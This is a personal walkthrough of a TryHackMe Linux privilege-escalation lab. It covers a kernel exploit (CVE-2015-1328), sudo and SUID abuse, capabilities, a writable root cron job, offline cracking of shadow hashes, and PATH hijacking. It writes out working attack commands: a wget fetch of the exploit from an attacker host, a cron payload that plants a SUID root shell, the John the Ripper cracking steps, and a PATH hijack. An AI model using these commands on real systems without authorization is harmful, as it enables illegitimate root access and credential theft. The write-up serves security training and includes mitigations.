# Linux Privilege Escalation
**Date:** July 15, 2026

## Overview

Privilege Escalation is the process of gaining higher privileges on a system after obtaining initial access. In most real-world penetration tests, the first compromise does not provide administrative (root) access. Instead, an attacker typically gains access as a low-privileged user and must identify vulnerabilities, misconfigurations, or insecure permissions to elevate their privileges.

This room introduces the fundamentals of Linux Privilege Escalation, explains why enumeration is the most important step after gaining access, and covers the Linux commands commonly used to identify potential privilege escalation vectors.

---

# Objective

The objective of this section is to understand:

- What Linux Privilege Escalation is.
- Why privilege escalation is important during penetration testing.
- The importance of post-exploitation enumeration.
- Common Linux commands used to gather system information.
- How enumeration helps identify privilege escalation opportunities.

---

# What is Privilege Escalation?

Privilege Escalation is the process of obtaining permissions beyond those originally assigned to a user account.

In Linux environments, this typically means escalating from a standard user account to the **root** account, which has unrestricted control over the operating system.

Privilege escalation is usually achieved by exploiting:

- Vulnerabilities in the operating system
- Misconfigured file or directory permissions
- Weak sudo configurations
- Vulnerable services
- SUID binaries
- Kernel vulnerabilities
- Insecure system configurations

---

# Why is Privilege Escalation Important?

Successfully gaining access to a target system is only the beginning of a penetration test. Most initial access provides limited permissions, preventing access to sensitive files or administrative functions.

Privilege escalation allows a penetration tester to obtain elevated permissions and fully assess the security of the target environment.

With elevated privileges, it becomes possible to:

- Reset user passwords
- Bypass file and directory permissions
- Access confidential or restricted data
- Modify system configurations
- Install persistence mechanisms
- Create or modify privileged user accounts
- Execute administrative commands
- Gain complete control over the target system

---

# Understanding Network Interfaces

During enumeration, identifying available network interfaces provides insight into how the system communicates with internal and external networks.

| Interface | Meaning | Purpose |
|-----------|---------|---------|
| **eth0** | Ethernet Interface | Primary wired or virtual network connection used for communication. |
| **lo** | Loopback Interface | Virtual interface used for communication with the local machine through `127.0.0.1` (localhost). |
| **tun0** | Tunnel Interface | Virtual interface created by VPN or tunneling software to route encrypted traffic. |
| **tun1** | Second Tunnel Interface | Additional VPN or tunnel interface when multiple tunnels are active. |

Understanding available interfaces helps identify:

- VPN connections
- Internal network segments
- Pivoting opportunities
- Additional reachable networks

---

# Enumeration

Enumeration is one of the most critical phases of privilege escalation.

After gaining access to a system, the next objective is to gather as much information as possible before attempting exploitation. Proper enumeration often reveals configuration mistakes or vulnerabilities that can be leveraged to obtain higher privileges.

Enumeration should focus on identifying:

- Operating system details
- Kernel version
- Installed software
- Running services
- User accounts
- Group memberships
- Environment variables
- Network interfaces
- Open ports
- Routing information
- Scheduled tasks
- File permissions
- SUID binaries
- Writable directories
- Sensitive configuration files

The more information collected, the greater the likelihood of identifying a successful privilege escalation path.

---

# Why Enumeration Matters

Unlike Capture The Flag (CTF) challenges, real-world penetration tests do not end after gaining access to a system.

Enumeration is an ongoing process that continues throughout the engagement. Every piece of information collected may reveal a new attack path or privilege escalation opportunity.

Experienced penetration testers spend a significant amount of time performing careful enumeration before attempting exploitation.

---

# Linux Privilege Escalation – Kernel Exploits, Sudo & SUID

## Overview

This section focuses on practical Linux privilege escalation techniques after completing system enumeration. It demonstrates how to identify kernel vulnerabilities, leverage automated enumeration tools, abuse misconfigured **sudo** permissions, and exploit **SUID binaries** to gain elevated privileges.

Rather than immediately attempting exploitation, the room emphasizes collecting system information first and using that information to identify the most appropriate privilege escalation path.

---

# Task 3 – Kernel Vulnerability Enumeration

## Objective

Identify the Linux kernel version running on the target machine and determine whether any publicly known vulnerabilities can be used for privilege escalation.

---

## Identifying the Kernel Version

The first step is identifying the exact kernel version.

```bash
uname -r
```

Example Output

```text
3.13.0-24-generic
```

This indicates that the target machine is running:

- Ubuntu 14.04 LTS
- Linux Kernel 3.13.0-24-generic

Knowing both the operating system version and kernel version is essential because many privilege escalation exploits are kernel-specific.

---

## Searching for Kernel Vulnerabilities

Once the kernel version is known, the next step is searching public vulnerability databases.

Useful resources include:

- ExploitDB
- Searchsploit
- NVD (National Vulnerability Database)
- CVE.org
- Rapid7

These databases contain publicly disclosed vulnerabilities along with exploit code and affected kernel versions.

After comparing the kernel version with available exploits, the system was identified as vulnerable to:

```
CVE-2015-1328
```

This vulnerability affects Ubuntu kernels prior to version 3.19 and allows local privilege escalation through OverlayFS.

---

## What I Learned

- Always identify the exact kernel version before searching for exploits.
- Kernel exploits are highly version-dependent.
- Public vulnerability databases are valuable resources during privilege escalation.
- Matching the operating system version with the kernel version is necessary before attempting exploitation.

---

# Task 4 – Automated Enumeration Tools

## Overview

Manual enumeration is essential, but several tools can automate the information-gathering process and identify common privilege escalation vectors.

Common Linux enumeration tools include:

- LinPEAS
- LinEnum
- Linux Exploit Suggester (LES)
- Linux Smart Enumeration (LSE)
- Linux Priv Checker

These tools help identify:

- Misconfigured permissions
- Writable directories
- SUID binaries
- Weak sudo configurations
- Kernel vulnerabilities
- Sensitive files
- Installed software
- Interesting services

Although these tools save time, they should complement manual enumeration rather than replace it.

---

# Task 5 – Privilege Escalation Using Kernel Exploits

## Objective

Exploit a vulnerable Linux kernel to obtain root privileges.

---

## Enumerating the Target

Using commands such as:

```bash
uname -r
cat /proc/version
cat /etc/os-release
```

I confirmed that the target was running:

- Ubuntu 14.04 LTS
- Kernel 3.13.0-24-generic

The system also had the GCC compiler installed, allowing C source code to be compiled locally.

---

## Finding an Exploit

Using ExploitDB and Searchsploit, I searched for exploits targeting the identified kernel version.

```bash
searchsploit overlayfs
```

The results showed an OverlayFS privilege escalation exploit associated with:

```
CVE-2015-1328
```

---

## Transferring the Exploit

After downloading the exploit on my local machine, I started a temporary HTTP server.

```bash
python -m http.server 8000
```

On the target machine, I attempted to download the exploit using:

```bash
wget http://<attacker-ip>:8000/37292.c
```

Initially the download failed because I was located inside the root (`/`) directory, where the current user did not have write permissions.

After changing to the writable `/tmp` directory:

```bash
cd /tmp
```

the exploit downloaded successfully.

---

## Compiling the Exploit

Since GCC was available on the target system, I compiled the exploit.

```bash
gcc 37292.c -o exploit
```

---

## Executing the Exploit

Running the compiled binary successfully escalated privileges to the root user.

This demonstrates how outdated Linux kernels can become severe privilege escalation vectors when known vulnerabilities remain unpatched.

---

## What I Learned

- Kernel exploits require an exact kernel version match.
- Enumeration determines whether kernel exploitation is possible.
- Writable directories such as `/tmp` are useful when transferring exploit files.
- A local compiler such as GCC simplifies exploitation.
- Always verify exploit compatibility before execution.

---

# Task 6 – Privilege Escalation Using Sudo

## Objective

Identify commands that the current user can execute with elevated privileges.

---

## Enumerating Sudo Permissions

```bash
sudo -l
```

This command displays every command the current user is permitted to execute using sudo.

In this room, the user **karen** was allowed to execute:

- find
- less
- nano

---

## Why This Matters

Many Linux commands can be abused when executed with elevated privileges.

Rather than searching for kernel vulnerabilities, attackers often first inspect sudo permissions because a single misconfigured command can immediately provide root access.

---

## Locating Sensitive Files

Since `find` could be executed using sudo, it was used to locate protected files.

Example:

```bash
sudo find / -name flag2.txt
```

Once located, the file could be accessed with elevated privileges.

---

## Reading Protected Files

Because `less` and `nano` also ran with sudo privileges, they could be used to open restricted files such as:

```text
/etc/shadow
```

This allowed access to password hashes that would normally be unreadable by regular users.

---

## Important Concept

Always compare the output of:

```bash
sudo -l
```

against **GTFOBins**.

GTFOBins documents hundreds of Linux binaries that can be abused for:

- Privilege Escalation
- File Read
- File Write
- Shell Escape
- Command Execution

---

## What I Learned

- `sudo -l` should always be one of the first commands executed after gaining access.
- Misconfigured sudo permissions are among the most common privilege escalation vectors.
- Many standard Linux utilities become dangerous when executed with sudo privileges.
- GTFOBins is an invaluable reference when analyzing privileged binaries.

---

# Task 7 – Privilege Escalation Using SUID

## Objective

Identify SUID binaries and determine whether any can be abused to obtain elevated privileges.

---

## What is SUID?

SUID (Set User ID) is a special Linux permission that causes a program to execute with the permissions of its owner instead of the user running it.

If a root-owned binary has the SUID bit enabled, every user executes that binary with root privileges.

---

## Enumerating SUID Binaries

The following command searches the system for SUID files.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

This lists every executable running with elevated privileges.

---

## Analyzing SUID Programs

After identifying available SUID binaries, compare each one with GTFOBins to determine whether it can be abused.

During this room, one interesting binary was:

```
base64
```

Although base64 is normally used for encoding and decoding data, GTFOBins documents methods for abusing its SUID permissions to read protected files.

---

## Reading Restricted Files

Using the SUID-enabled base64 binary, protected files such as:

```text
/etc/passwd
```

and

```text
/etc/shadow
```

could be read even without root privileges.

Example:

```bash
base64 /etc/passwd | base64 --decode
```

---

## Recovering Password Hashes

The password hashes extracted from `/etc/shadow` were combined with the user information from `/etc/passwd`.

After transferring both files to my local machine, I used:

```bash
unshadow passwd shadow > hashes.txt
```

to combine them.

Finally, I used John the Ripper to crack the password hashes.

```bash
john hashes.txt
```

This successfully recovered the password for one of the users.

---

## Accessing Protected Files

Since the SUID-enabled binary allowed restricted files to be read, protected flag files could also be accessed without requiring root privileges.

---

# Linux Privilege Escalation – Capabilities, Cron Jobs & Password Hash Extraction

## Overview

This section focuses on additional Linux privilege escalation techniques involving **Linux Capabilities**, **Cron Jobs**, and **Offline Password Hash Cracking**. These are common privilege escalation vectors encountered during penetration tests and real-world Linux environments.

Unlike kernel exploits or SUID binaries, these techniques take advantage of misconfigured capabilities, scheduled tasks running with elevated privileges, and weak password management.

---

# Task 8 – Privilege Escalation Using Linux Capabilities

## Objective

Learn how Linux Capabilities can grant privileged functionality to specific binaries without giving them full root privileges, and identify binaries that can be abused to access restricted files.

---

## What are Linux Capabilities?

Traditionally, Linux applications either ran with normal user privileges or with full root privileges.

Linux **Capabilities** divide root privileges into smaller, more manageable permissions that can be assigned to individual executables.

Instead of granting complete root access, a binary can receive only the capabilities it requires.

For example:

- Network administration
- Raw socket access
- Reading restricted files
- Mounting file systems
- Changing file ownership

Although capabilities improve security, misconfigured capabilities can also become privilege escalation vectors.

---

## Enumerating Capabilities

The first step is identifying binaries with capabilities assigned.

```bash
getcap -r / 2>/dev/null
```

### Explanation

- `getcap` displays Linux capabilities assigned to files.
- `-r` recursively searches the filesystem.
- `2>/dev/null` suppresses permission-denied errors.

---

## Results

The enumeration revealed **six binaries** with assigned capabilities.

These included common utilities such as:

- ping
- vim
- view

Since some of these binaries could access files with elevated permissions, they became potential privilege escalation vectors.

---

## Identifying Interesting Binaries

Among the discovered binaries, **view** was particularly interesting.

Unlike a normal text editor, it had been granted capabilities that allowed it to read files beyond the permissions of the current user.

---

## Reading Protected Files

Using the privileged `view` binary, protected files could be opened without requiring root privileges.

Examples include:

```text
/etc/passwd
/etc/shadow
```

---

## Locating the Flag

Before reading the flag, its location had to be identified manually.

The file was eventually found under:

```text
/home/ubuntu/flag4.txt
```

Using the privileged binary:

```bash
view /home/ubuntu/flag4.txt
```

allowed the protected file to be read successfully.

---

## What I Learned

- Linux Capabilities provide fine-grained privileges instead of full root access.
- Misconfigured capabilities can become privilege escalation vectors.
- `getcap` is the primary tool for enumerating file capabilities.
- Capabilities should always be inspected during Linux enumeration.
- GTFOBins documents capability-based privilege escalation techniques for many binaries.

---

# Privilege Escalation Using Cron Jobs

## Objective

Exploit a writable script executed automatically by the root user's cron scheduler to obtain root privileges.

---

# Understanding Cron

Cron is the Linux task scheduler.

It automatically executes commands or scripts at predefined intervals.

System-wide scheduled jobs are commonly stored in:

```text
/etc/crontab
```

If a privileged cron job executes a script writable by a low-privileged user, arbitrary commands can be executed with elevated privileges.

---

# Enumerating Cron Jobs

The first step was inspecting scheduled tasks.

```bash
cat /etc/crontab
```

Example output:

```text
* * * * * root /antivirus.sh
* * * * * root antivirus.sh
* * * * * root /home/karen/backup.sh
* * * * * root /tmp/test.py
```

Among these jobs, the most interesting was:

```text
/home/karen/backup.sh
```

because it was executed every minute as the **root** user.

---

# Checking File Permissions

Next, I verified whether the script was writable.

```bash
ls -l /home/karen/backup.sh
```

Output:

```text
-rw-r--r-- 1 karen karen ...
```

The file was owned by **karen**, meaning the current user could modify it despite it being executed by root.

This represents a dangerous privilege escalation misconfiguration.

---

# Exploitation

I replaced the script contents with a payload that creates a SUID root shell.

```bash
printf '#!/bin/sh\ncp /bin/sh /tmp/root_sh\nchmod 4755 /tmp/root_sh\n' > /home/karen/backup.sh
```

Contents of the script:

```sh
#!/bin/sh

cp /bin/sh /tmp/root_sh
chmod 4755 /tmp/root_sh
```

Then made it executable.

```bash
chmod +x /home/karen/backup.sh
```

---

# Waiting for Cron Execution

Cron executes scheduled tasks once every minute.

After waiting approximately one minute, I verified whether the payload had executed.

```bash
ls -l /tmp/root_sh
```

Output:

```text
-rwsr-xr-x 1 root root ...
```

The **SUID bit** confirmed that the copied shell would execute with root privileges.

---

# Obtaining Root Access

Executing the SUID shell:

```bash
/tmp/root_sh -p
```

Then verifying privileges:

```bash
whoami
```

Output:

```text
root
```

Root privileges had been successfully obtained.

---

# Capturing the Flag

After gaining root access, the protected flag could be read.

```bash
cat /home/ubuntu/flag5.txt
```

---

# Why the Exploit Worked

The vulnerable cron entry executed:

```text
/home/karen/backup.sh
```

as **root** every minute.

Since the script itself was writable by a low-privileged user, arbitrary commands were executed with root privileges.

The payload:

1. Copied `/bin/sh`
2. Set the **SUID** permission (`4755`)
3. Created a permanent root shell

Executing:

```bash
/tmp/root_sh -p
```

spawned a root shell without requiring the root password.

---

# Commands Used

```bash
# View scheduled tasks
cat /etc/crontab

# Check script permissions
ls -l /home/karen/backup.sh

# Replace the vulnerable script
printf '#!/bin/sh\ncp /bin/sh /tmp/root_sh\nchmod 4755 /tmp/root_sh\n' > /home/karen/backup.sh

# Make executable
chmod +x /home/karen/backup.sh

# Verify the created SUID shell
ls -l /tmp/root_sh

# Spawn root shell
/tmp/root_sh -p

# Confirm privileges
whoami

# Read protected flag
cat /home/ubuntu/flag5.txt
```

---

# Key Takeaways

- Always inspect `/etc/crontab`.
- Look for scripts executed as **root**.
- Verify whether those scripts are writable.
- Writable root cron jobs almost always lead to privilege escalation.
- Creating a SUID shell is a common post-exploitation technique.

---

# Security Impact

Misconfigured cron jobs allow attackers to execute arbitrary commands as root.

This often results in complete system compromise.

### Mitigation

- Ensure cron scripts are owned by root.
- Remove write permissions from unprivileged users.
- Store scripts inside administrator-controlled directories.
- Regularly audit scheduled tasks.

---

# Password Hash Extraction & Offline Cracking

## Objective

Extract password hashes after obtaining root privileges and recover weak passwords using John the Ripper.

---

# Background

After escalating privileges to root, protected files such as:

```text
/etc/shadow
```

became accessible.

Unlike `/etc/passwd`, `/etc/shadow` stores password hashes and is readable only by root.

---

# Identifying the Target User

First, I confirmed that the user **matt** existed.

```bash
grep "matt" /etc/passwd
```

Output:

```text
matt:x:1002:1002::/home/matt:/bin/sh
```

---

# Extracting the Password Hash

The user's password hash was extracted from `/etc/shadow`.

```bash
grep "^matt:" /etc/shadow > /tmp/matt.hash
```

Example output:

```text
matt:$6$WHmIjebL7MA7KN9A$...
```

The prefix:

```text
$6$
```

indicates that the password uses the **SHA-512 Crypt** hashing algorithm.

---

# Transferring the Hash

A temporary HTTP server was started.

```bash
cd /tmp
python3 -m http.server 8000
```

From the Kali machine:

```bash
wget http://<TARGET_IP>:8000/matt.hash
```

downloaded the extracted hash.

---

# Cracking the Password

John the Ripper was used with the RockYou wordlist.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt matt.hash
```

After successfully recovering the password:

```bash
john --show matt.hash
```

displayed the plaintext credentials.

---

# What I Learned

- `/etc/passwd` stores account information.
- `/etc/shadow` stores password hashes.
- Root privileges are required to access `/etc/shadow`.
- Password hashes can be cracked offline.
- Weak passwords remain vulnerable even when stored using secure hashing algorithms.

---

# Commands Used

```bash
# Verify user
grep "matt" /etc/passwd

# Extract password hash
grep "^matt:" /etc/shadow > /tmp/matt.hash

# Start HTTP server
cd /tmp
python3 -m http.server 8000

# Download hash from Kali
wget http://<TARGET_IP>:8000/matt.hash

# Crack using John
john --wordlist=/usr/share/wordlists/rockyou.txt matt.hash

# Display recovered password
john --show matt.hash
```

---

# Key Takeaways

- Root access allows attackers to extract password hashes from `/etc/shadow`.
- Weak passwords can often be recovered quickly using dictionary attacks.
- John the Ripper is one of the most widely used offline password-cracking tools.
- Even strong hashing algorithms cannot protect weak passwords.

---

# Security Impact

After obtaining root privileges, attackers can extract password hashes for every local user.

Offline password cracking enables attackers to compromise additional accounts, perform credential reuse attacks, and expand access throughout the environment.

### Mitigation

- Enforce strong, unique passwords.
- Use modern password hashing algorithms with appropriate work factors.
- Protect privileged access to `/etc/shadow`.
- Enable multi-factor authentication wherever possible.
- Regularly audit privileged accounts and password policies.

---

# TryHackMe - Linux Privilege Escalation
# PATH Hijacking Privilege Escalation

## Room

**TryHackMe – Linux Privilege Escalation**

---

# Objective

Exploit a **PATH Hijacking** vulnerability in a SUID binary to execute arbitrary commands with **root privileges** by abusing the Linux PATH environment variable.

---

# Overview

One of the common privilege escalation techniques in Linux is **PATH Hijacking**. This occurs when a privileged program executes another command **without specifying its absolute path**.

When Linux encounters a command such as:

```c
system("thm");
```

instead of

```c
system("/usr/bin/thm");
```

it searches each directory listed in the **PATH** environment variable until it finds an executable with that name.

If an attacker can place a malicious executable in a writable directory that appears **earlier** in the PATH, the privileged program will execute the attacker's binary instead of the intended one.

---

# Understanding the PATH Variable

The PATH environment variable tells Linux where to search for executables.

Display the current PATH:

```bash
echo $PATH
```

Example output:

```text
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Linux searches these directories **from left to right**.

The first matching executable found is the one that gets executed.

---

# Enumeration

## Step 1 – View the PATH Variable

The first step was checking the current PATH.

```bash
echo $PATH
```

Understanding the search order is important because PATH Hijacking depends on controlling which executable Linux finds first.

---

## Step 2 – Identify Writable Directories

Next, I searched for writable directories where a malicious executable could be placed.

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

### Command Breakdown

- `find / -writable` → Searches for writable files and directories.
- `2>/dev/null` → Suppresses permission denied errors.
- `cut` → Simplifies the output.
- `grep -v proc` → Excludes `/proc`.
- `sort -u` → Removes duplicates.

Example output:

```text
home/murdoch
tmp
var/tmp
```

### Room Question

**What is the odd folder you have write access for?**

Answer:

```text
/home/murdoch
```

Although `/tmp` is commonly writable and was later used during exploitation, the room specifically highlighted `/home/murdoch` as the unusual writable directory.

---

## Step 3 – Enumerate SUID Binaries

Since PATH Hijacking usually targets privileged executables, I searched for SUID binaries.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the standard Linux binaries, one custom executable stood out.

```text
/home/murdoch/test
```

Unlike common SUID programs such as `passwd` or `su`, this binary resided inside a user's home directory, making it suspicious.

---

## Step 4 – Verify SUID Permissions

I verified its permissions.

```bash
ls -l /home/murdoch/test
```

Output:

```text
-rwsr-xr-x 1 root root 16712 Jun 20 2021 /home/murdoch/test
```

The **s** in the owner's permission field indicates that the **SUID** bit is enabled.

This means the executable always runs with the privileges of its owner (**root**).

---

## Step 5 – Investigate the Binary

Normally, I would inspect the binary using `strings`.

However, `strings` was unavailable on the target system, so I used **ltrace** to observe its library calls.

```bash
ltrace /home/murdoch/test
```

Output:

```text
setuid(0)
setgid(0)
system("thm")
sh: 1: thm: not found
```

This immediately revealed the vulnerability.

The binary executes:

```c
system("thm");
```

instead of:

```c
system("/usr/bin/thm");
```

Since no absolute path is provided, Linux searches for the executable using the PATH variable.

This behavior makes the program vulnerable to **PATH Hijacking**.

---

# Exploitation

## Step 1 – Modify the PATH

To ensure Linux searches my controlled directory first, I prepended `/tmp` to the PATH variable.

```bash
export PATH=/tmp:$PATH
```

Verify the updated PATH:

```bash
echo $PATH
```

Example output:

```text
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:...
```

Now Linux checks `/tmp` before any system directory.

---

## Step 2 – Create a Malicious Executable

Since the vulnerable binary executes a program named **thm**, I created my own executable with that name.

```bash
cp /bin/bash /tmp/thm
chmod +x /tmp/thm
```

This creates an executable shell named **thm** inside `/tmp`.

Whenever Linux searches for `thm`, it now finds my executable first.

---

## Step 3 – Execute the Vulnerable Binary

Run the SUID executable.

```bash
/home/murdoch/test
```

Internally, it executes:

```c
system("thm");
```

Linux searches the PATH.

Because `/tmp` appears before the system directories, my malicious executable is launched.

Since the vulnerable binary executes with **root privileges**, my shell also executes as **root**.

---

# Verify Root Access

Confirm the current user.

```bash
whoami
```

Output:

```text
root
```

Display detailed user information.

```bash
id
```

Output:

```text
uid=0(root)
gid=0(root)
groups=0(root),1001(karen)
```

Root privileges were successfully obtained.

---

# Capture the Flag

Locate the flag.

```bash
find / -name flag6.txt 2>/dev/null
```

Read the flag.

```bash
cat /path/to/flag6.txt
```

---

# Why the Exploit Worked

The vulnerable program executed:

```c
system("thm");
```

Because no absolute path was specified, Linux searched every directory listed in PATH.

Initially:

```text
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
...
```

After modifying PATH:

```text
/tmp
/usr/local/sbin
/usr/local/bin
...
```

Linux located my malicious executable inside `/tmp` before reaching the legitimate system directories.

Since the SUID binary itself executes as **root**, my executable also inherited root privileges.

---

# Pentester Methodology

When investigating potential PATH Hijacking vulnerabilities, I followed this workflow:

### 1. Enumerate SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

### 2. Ignore standard Linux binaries

Focus on custom or unfamiliar executables.

### 3. Verify permissions

```bash
ls -l binary
```

### 4. Inspect program behavior

```bash
ltrace binary
```

### 5. Identify commands executed without absolute paths

Look for functions such as:

```text
system("command")
execve("command")
popen("command")
```

### 6. Modify the PATH

```bash
export PATH=/tmp:$PATH
```

### 7. Create a malicious executable with the expected name

### 8. Execute the vulnerable program

### 9. Verify privilege escalation

---

# Commands Used

```bash
# Display PATH
echo $PATH

# Find writable directories
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

# Enumerate SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Verify permissions
ls -l /home/murdoch/test

# Inspect library calls
ltrace /home/murdoch/test

# Modify PATH
export PATH=/tmp:$PATH

# Verify PATH
echo $PATH

# Create malicious executable
cp /bin/bash /tmp/thm
chmod +x /tmp/thm

# Execute vulnerable binary
/home/murdoch/test

# Verify privileges
whoami
id

# Locate the flag
find / -name flag6.txt 2>/dev/null

# Read the flag
cat /path/to/flag6.txt
```

---

# Key Concepts Learned

- Linux PATH environment variable
- PATH search order
- PATH Hijacking
- SUID binaries
- `system()` function
- `ltrace`
- Writable directory enumeration
- Custom binary analysis
- Privilege escalation methodology

---

# Security Impact

PATH Hijacking occurs when privileged applications execute commands without specifying their absolute paths.

If an attacker can place a malicious executable in a writable directory that appears earlier in the PATH environment variable, Linux executes the attacker's program instead of the intended executable.

Because the vulnerable application runs with elevated privileges, the malicious executable also inherits those privileges, potentially leading to complete system compromise.

---

## Mitigation

- Always use absolute paths when executing system commands.
- Avoid using `system()` where safer alternatives exist.
- Never rely on user-controlled PATH variables.
- Remove unnecessary SUID permissions.
- Audit custom privileged binaries regularly.
- Restrict write access to directories included in PATH.

---



